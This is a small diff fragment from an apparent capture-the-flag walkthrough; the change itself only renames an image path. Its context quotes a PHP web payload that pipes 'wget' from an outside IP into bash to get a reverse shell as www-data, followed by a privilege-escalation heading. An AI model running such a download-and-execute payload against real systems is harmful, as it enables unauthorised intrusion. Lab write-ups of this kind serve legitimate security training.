@@ -219,7 +219,7 @@ We can then replace the command with ``<?=`wget -O - 10.10.14.152/b|bash` ?>``
 
 Now, we have a reverse shell as `www-data`.
 
-<figure><img src="../../../.gitbook/assets/image (11) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (11) (1) (3) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation to Victor
 
